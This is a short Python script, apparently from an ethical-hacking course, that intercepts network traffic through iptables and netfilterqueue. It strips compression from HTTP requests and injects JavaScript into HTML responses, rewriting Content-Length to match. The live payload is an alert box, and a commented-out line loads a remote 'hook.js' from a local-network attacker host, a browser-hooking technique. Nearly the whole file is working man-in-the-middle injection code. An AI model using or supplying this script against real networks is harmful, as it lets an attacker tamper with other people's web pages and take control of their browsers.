#!/usr/bin/env python

# use command (   iptables -I OUTPUT -j NFQUEUE --queue-num 0   )
# use command (   iptables -I INPUT -j NFQUEUE --queue-num 0   )
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # wrapping packet with scapy IP layer
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = str(scapy_packet[scapy.Raw].load)
            # if scapy_packet[scapy.TCP].dport == 80:
            if scapy_packet[scapy.TCP].dport == 10000:
                print("[+] Request")
                print(scapy_packet.show())
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            # elif scapy_packet[scapy.TCP].sport == 80:
            elif scapy_packet[scapy.TCP].sport == 10000:
                print("[+] Response")
                # injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                injection_code = '<script>alert("hello");</script>'
                load = load.replace("</body>", injection_code + "</body>")
                # load = load.replace("<body>", "<body>" + injection_code)
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    # print(content_length_search.group(1))
                # print(scapy_packet.show())

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

        except UnicodeDecodeError:
            pass

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
